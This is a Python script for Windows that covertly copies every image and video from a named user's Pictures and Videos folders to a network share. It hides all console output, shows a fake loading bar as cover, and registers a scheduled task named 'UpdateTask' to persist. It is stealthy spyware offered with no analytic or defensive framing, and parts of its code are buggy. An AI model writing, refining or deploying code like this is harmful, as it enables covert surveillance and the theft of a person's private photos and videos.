import os
import shutil
import time
import win32com.client
import sys

images_source_dir = r'C:\Users\Nadine\Pictures'  
videos_source_dir = r'C:\Users\Nadine\Videos'    
destination_dir = r'\\192.168.1.16\S'  
script_path = os.path.abspath(__file__)
task_name = 'UpdateTask'
task_time = '2024-01-01 02:00:00'  

# Function to copy files
def copy_files(source, destination):
    if not os.path.exists(destination):
        os.makedirs(destination)
    for filename in os.listdir(source):
        if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp', '.gif', '.mp4', '.avi', '.mkv', '.mov', '.flv')):  # Add more extensions if needed
            shutil.copy(os.path.join(source, filename), destination)
            # print(f'Copied: {filename}')  # Comment out or redirect this line to suppress output

# Display a loading bar
def display_loading_bar(duration):
    for i in range(duration):
        print('\rLoading... [' + '=' * (i // 2) + ' ' * (25 - i // 2) + ']', end='', flush=True)
        time.sleep(0.5)
    print('\rLoading... [==========================]', flush=True)

def schedule_task(task_name, script_path, task_time):
    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()

    task_def = scheduler.NewTask(0)
    task_def.RegistrationInfo.Description = 'task'
    task_def.Triggers.Create(1) 
    task_def.Triggers.Item(1).StartBoundary = task_time
    task_def.Actions.Create(0)  
    task_def.Actions.Item(0).Path = 'C:\Users\Nadine\PFA\.f\driver.py'  # Change this to the path of your Python executable
    task_def.Actions.Item(0).Arguments = f'"{script_path}"'

    folder = scheduler.GetFolder('\\')
    folder.RegisterTaskDefinition(task_name, task_def, 6, '', '', 0, '')

def main():
    # Suppress console output
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

    # Display loading bar
    display_loading_bar(25)

    # Copy files from Images folder
    copy_files(images_source_dir, destination_dir)

    # Copy files from Videos folder
    copy_files(videos_source_dir, destination_dir)

    # Schedule the task
    schedule_task(task_name, script_path, task_time)

    # Display completion message
    display_loading_bar(25)

if __name__ == '__main__':
    main()